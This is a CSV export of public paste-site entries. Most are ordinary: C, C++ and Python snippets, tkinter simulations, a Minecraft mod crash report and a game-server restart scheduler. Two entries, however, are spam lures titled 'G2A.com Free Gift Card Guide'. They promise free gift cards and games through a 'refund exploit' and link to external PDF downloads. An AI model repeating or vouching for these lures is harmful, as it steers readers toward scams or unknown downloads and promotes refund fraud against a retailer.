id,title,username,language,date,content
Xh5Ra9Gj,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Friday 8th of March 2024 12:04:46 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_917199.pdf

Working as of:
08 March 2024"
mVBTNLTG,Untitled,Sreekar_0125,C++,Thursday 7th of March 2024 11:36:48 PM CDT,"T query(size_t treeIndex, size_t left, size_t right)
    {
        cerr << ""qL : "" << queryLeft << ' ' << ""qR : "" << queryRight << endl;
        cerr << treeIndex << ' ' << left << ' ' << right << endl;
        if (queryLeft <= left && right <= queryRight)
            return tree[treeIndex];

        size_t mid = left + (right - left) / 2;
        cerr << ""mid : "" << mid << endl;
        if (queryRight <= mid)
            return query(2 * treeIndex + 1, left, mid);
        if (queryLeft > mid)
        {
           return query(2 * treeIndex + 2, mid + 1, right); 
        }
        
        int Left = query(2 * treeIndex + 1, left, mid);
        int Right = query(2 * treeIndex + 2, mid + 1, right);
        
        if(treeIndex == 0)
        {
            cerr << ""Final Returning : "" << Left << ' ' << Right << endl;
        }
            
        return max(Left, Right);
    }"
YEn5uM66,Exception_%s,naren_paste,Python,Thursday 7th of March 2024 11:30:43 PM CDT,"from functools import reduce
import logging as logs

logs.basicConfig(
    filename=""calc.log"",
    level=logs.DEBUG,
    format=""[%(asctime)s] %(lineno)d-%(name)s-%(levelname)s-%(message)s"",
)


class cal_culator:
    def __init__(calc, user_name):
        try:
            logs.info(""taking the username"")
            calc.username = user_name
            logs.info(user_name)
        except Exception as e:
            logs.error(e)

    def add_tion(calc, *args):
        try:
            logs.info(""taking the data from user to produce addition of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the sum is',sum(args))
            return calc.username, sum(args)

        except TypeError as t:
            logs.error(t)

    def sub_traction(calc, *args):

        try:
            logs.info(""taking the data tpo produce the subtraction "")
            logs.info(""enterd data is %s"", args)
            # logs.info('the subtraction is',reduce(lambda a,b:a-b,args))
            return calc.username, reduce(lambda a, b: a - b, args)
            logs.info(args)
        except TypeError as t:
            logs.error(t)

    def multi_plication(calc, *args):
        try:
            logs.info(""taking the data to produce multiplication of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the product is',reduce (lambda a,b:a*b,args))
            return calc.username, reduce(lambda a, b: a * b, args)
            logs.info(args)
        except TypeError as t:
            logs.error(t)

    def div_sion(calc, *args):
        try:
            logs.info(""taking the data to produce division of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the product is',reduce (lambda a,b:a/b,args))
            return calc.username, reduce(lambda a, b: a / b, args)
            logs.info(args)
            logs.info(args)
        except Exception as e:
            logs.error(e)


obj = cal_culator(""sushant"")
print(obj.add_tion(*[1, 2, 3]))
print(obj.sub_traction(*[1, 2, 3]))
print(obj.multi_plication(*[1, 2, 3]))
print(obj.div_sion(*[1, 2, 3]))
"
aUC8WWGa,# tk_rock_paper_scissors_sim2.py,here2share,Python,Thursday 7th of March 2024 11:00:15 PM CDT,"# tk_rock_paper_scissors_sim2.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 480
WINDOW_HEIGHT = 480
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 120
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 21
CONVERT_RADIUS = 18
SPEED = 1

root = tk.Tk()
root.title(""tk_rock_paper_scissors_sim"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT + 100, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT + 100, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if chase[entity] == entity2:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

r = 10
def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - r, y - r, x + r, y + r), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
	draw = ImageDraw.Draw(pil_image)

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 100, anchor='nw', image=photo_image)
	canvas.create_text(CX, 36, text=food_chain, anchor='center', fill=""gray"", font=(""Verdana"", 24, ""italic""))
	root.update()"
gb1EFf6C,Untitled,Ionian_Caster,C,Thursday 7th of March 2024 10:55:04 PM CDT,"#include <stdio.h>
#include <stdlib.h>

#define SIZE 100

void fillRandom(int* array, int size, int border) {
    for (int i = 0; i < size; ++i) {
        *(array + i) = rand() % border;
    }
}

void printIntArray(int* array, int size, int offset) {
    char format[7];
    sprintf(format, ""%%%dd"", offset);
    for (int i = 0; i < size; ++i) {
        printf(format, array[i]);
        if (i != size - 1)
            printf("","");
    }
    printf(""\n"");
}

void swap(int* lhs, int* rhs) {
    *lhs ^= *rhs;
    *rhs ^= *lhs;
    *lhs ^= *rhs;
}

void bubbleSort(int* array, int size) {
    for (int i = 0; i < size; ++i) {
        for (int j = 0; j < size - 1; ++j) {
            if (array[j] > array[j + 1]) {
                swap(&array[j], &array[j + 1]);
            }
        }
    }
}

int main(void) {
    int arr[SIZE];
    fillRandom(arr, SIZE, 100);
    printIntArray(arr, SIZE, 3);
    bubbleSort(arr, SIZE);
    printIntArray(arr, SIZE, 3);
    return 0;
}
"
jkYpUrHm,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Thursday 7th of March 2024 10:52:14 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1QX2f9c6IIh85U8kry1bxwlS9OdjQFGFZ/view?usp=sharing
or
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
08 March 2024"
L05ySSXr,Untitled,Ionian_Caster,C,Thursday 7th of March 2024 10:39:35 PM CDT,"#include <stdio.h>

#define UNITE 1
#define UNITED 2

int meow(int kittensOfTheWorld) {
    if (kittensOfTheWorld < UNITED) return kittensOfTheWorld;

    return meow(kittensOfTheWorld - UNITE) + meow(kittensOfTheWorld - UNITED);
}

int fibLoop(int num) {
    int prevprev = 0;
    int prev = 1;

    if (num < UNITED) return num;
    int i = 2;
    int current = 0;

    do {
        current = prev + prevprev;
        prevprev = prev;
        prev = current;
        i++;
    } while (i <= num);

    return current;
}

int main(void) {
    for (int i = 0; i < 50; ++i) {
        printf(""%dth Fibonacci number is: %d\n"", i, fibLoop(i));
    }
    return 0;
}
"
t6hAx8y6,# tk_rock_paper_scissors_sim.py,here2share,Python,Thursday 7th of March 2024 10:24:31 PM CDT,"# tk_rock_paper_scissors_sim.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 500
WINDOW_HEIGHT = 500
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 150
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 21
CONVERT_RADIUS = 18
SPEED = 1

root = tk.Tk()
root.title(""tk_rock_paper_scissors_sim"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT + 100, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT + 100, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if distance < CONVERT_RADIUS and chase[entity] == entity2:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)
while True:

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 100, anchor='nw', image=photo_image)
	canvas.create_text(CX, 36, text=food_chain, anchor='center', fill=""gray"", font=(""Verdana"", 24, ""italic""))
	root.update()"
jXrg8gRj,crash-2024-03-07_23.51.02-client,Urara_Chiya,Java,Thursday 7th of March 2024 10:07:26 PM CDT,"---- Minecraft Crash Report ----

WARNING: coremods are present:
  FugueLoadingPlugin (Fugue-1.12.2-0.5.4.jar)
  MixinBooter (cleanroom-15.24.0.3029-universal.jar)
Contact their authors BEFORE contacting forge

// My bad.

Time: 2024-03-08 11:35
Description: There was a severe problem during mod loading that has caused the game to fail

net.minecraftforge.fml.common.LoaderExceptionModCrash: Caught exception from Railcraft (railcraft)
Caused by: net.minecraft.util.ReportedException: Loading Railcraft Module
	at mods.railcraft.common.modules.RailcraftModuleManager.processStage(RailcraftModuleManager.java:266)
	at mods.railcraft.common.modules.RailcraftModuleManager.preInit(RailcraftModuleManager.java:202)
	at mods.railcraft.common.core.Railcraft.preInit(Railcraft.java:116)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at net.minecraftforge.fml.common.FMLModContainer.handleModStateEvent(FMLModContainer.java:637)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:85)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:142)
	at com.google.common.eventbus.Subscriber.lambda$dispatchEvent$0(Subscriber.java:71)
	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:68)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:111)
	at com.google.common.eventbus.EventBus.post(EventBus.java:270)
	at net.minecraftforge.fml.common.LoadController.sendEventToModContainer(LoadController.java:279)
	at net.minecraftforge.fml.common.LoadController.propogateStateMessage(LoadController.java:257)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:85)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:142)
	at com.google.common.eventbus.Subscriber.lambda$dispatchEvent$0(Subscriber.java:71)
	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:68)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:111)
	at com.google.common.eventbus.EventBus.post(EventBus.java:270)
	at net.minecraftforge.fml.common.LoadController.distributeStateMessage(LoadController.java:193)
	at net.minecraftforge.fml.common.Loader.preinitializeMods(Loader.java:630)
	at net.minecraftforge.fml.client.FMLClientHandler.beginMinecraftLoading(FMLClientHandler.java:251)
	at net.minecraft.client.Minecraft.func_71384_a(Minecraft.java:467)
	at net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:378)
	at net.minecraft.client.main.Main.main(SourceFile:123)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.cleanroommc.bouncepad.Bouncepad.launch(Bouncepad.java:136)
	at com.cleanroommc.bouncepad.Bouncepad.main(Bouncepad.java:38)
	at org.prismlauncher.launcher.impl.StandardLauncher.launch(StandardLauncher.java:87)
	at org.prismlauncher.EntryPoint.listen(EntryPoint.java:129)
	at org.prismlauncher.EntryPoint.main(EntryPoint.java:70)
Caused by: java.lang.ExceptionInInitializerError
	at mods.railcraft.common.blocks.aesthetics.metals.BlockMetal.initializeDefinition(BlockMetal.java:66)
	at mods.railcraft.common.blocks.RailcraftBlocks$BlockDef.register(RailcraftBlocks.java:247)
	at mods.railcraft.common.blocks.RailcraftBlocks$BlockDef.access$100(RailcraftBlocks.java:199)
	at mods.railcraft.common.blocks.RailcraftBlocks.register(RailcraftBlocks.java:275)
	at java.base/java.lang.Iterable.forEach(Iterable.java:75)
	at mods.railcraft.common.modules.RailcraftModulePayload$BaseModuleEventHandler.preInit(RailcraftModulePayload.java:78)
	at mods.railcraft.common.modules.RailcraftModuleManager$Stage$2.passToModule(RailcraftModuleManager.java:312)
	at mods.railcraft.common.modules.RailcraftModuleManager.processStage(RailcraftModuleManager.java:253)
	... 38 more
Caused by: java.lang.ClassCastException: class mods.railcraft.common.blocks.aesthetics.metals.BlockMetal
	at java.base/java.lang.Class.asSubclass(Class.java:4102)
	at mods.railcraft.common.plugins.forge.DataManagerPlugin.create(DataManagerPlugin.java:137)
	at mods.railcraft.common.carts.EntityTunnelBore.<clinit>(EntityTunnelBore.java:90)
	... 46 more


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- System Details --
Details:
	Minecraft Version: 1.12.2
	Operating System: Windows 11 (amd64) version 10.0
	Java Version: 21.0.2, Microsoft
	Java VM Version: OpenJDK 64-Bit Server VM (mixed mode, sharing), Microsoft
	Memory: 249575704 bytes (238 MB) / 536870912 bytes (512 MB) up to 6442450944 bytes (6144 MB)
	JVM Flags: 21 total; -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xms512m -Xmx6144m
	IntCache: cache: 0, tcache: 0, allocated: 0, tallocated: 0
	FML: MCP 9.42 Powered by Cleanroom 14.23.5.0 8 mods loaded, 8 mods active
	States: 'U' = Unloaded 'L' = Loaded 'C' = Constructed 'H' = Pre-initialized 'I' = Initialized 'J' = Post-initialized 'A' = Available 'D' = Disabled 'E' = Errored

	| State | ID            | Version      | Source                               | Signature                                |
	|:----- |:------------- |:------------ |:------------------------------------ |:---------------------------------------- |
	| LCH   | minecraft     | 1.12.2       | minecraft.jar                        | None                                     |
	| LCH   | mcp           | 9.42         | minecraft.jar                        | None                                     |
	| LCH   | configanytime | 2.0          | minecraft.jar                        | None                                     |
	| LCH   | FML           | 8.0.99.99    | cleanroom-15.24.0.3029-universal.jar | None                                     |
	| LCH   | forge         | 14.23.5.0    | cleanroom-15.24.0.3029-universal.jar | None                                     |
	| LCH   | mixinbooter   | 10.0         | minecraft.jar                        | None                                     |
	| LCH   | fugue         | 1.12.2-0.5.4 | Fugue-1.12.2-0.5.4.jar               | None                                     |
	| LCE   | railcraft     | 12.0.0       | railcraft-12.0.0.jar                 | a0c255ac501b2749537d5824bb0f0588bf0320fa |

	Loaded coremods (and transformers): 
FugueLoadingPlugin (Fugue-1.12.2-0.5.4.jar)
  com.cleanroommc.transformer.CommonRegistrar$Transformer
MixinBooter (cleanroom-15.24.0.3029-universal.jar)
  
	GL info: ' Vendor: 'Intel' Version: '4.6.0 - Build 31.0.101.2125' Renderer: 'Intel(R) Iris(R) Plus Graphics'"
Jg2c7JQ7,# tk_war.py,here2share,Python,Thursday 7th of March 2024 09:45:17 PM CDT,"# tk_war.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 500
WINDOW_HEIGHT = 500
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 150
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 25
CONVERT_RADIUS = 20
SPEED = 1

root = tk.Tk()
root.title(""tk_war"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

cxy = {
    ""rock"": """",
    ""scissors"": """",
    ""paper"": """"
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if distance < CONVERT_RADIUS:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)
while True:

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 0, anchor='nw', image=photo_image)
	root.update()"
0sgxjnXC,Scheduler.xml,iKurdo,XML,Thursday 7th of March 2024 08:47:02 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes"" ?>
<Scheduler>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='0'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='1'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='2'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='3'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='4'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='5'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='6'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='7'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='8'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='9'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='10'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='11'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='12'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='13'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='14'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='15'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='16'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='17'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='18'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='19'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='20'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='21'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='22'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='23'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='24'>
		<day>1,2,3,4,5,6,7</day>
		<start>07:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
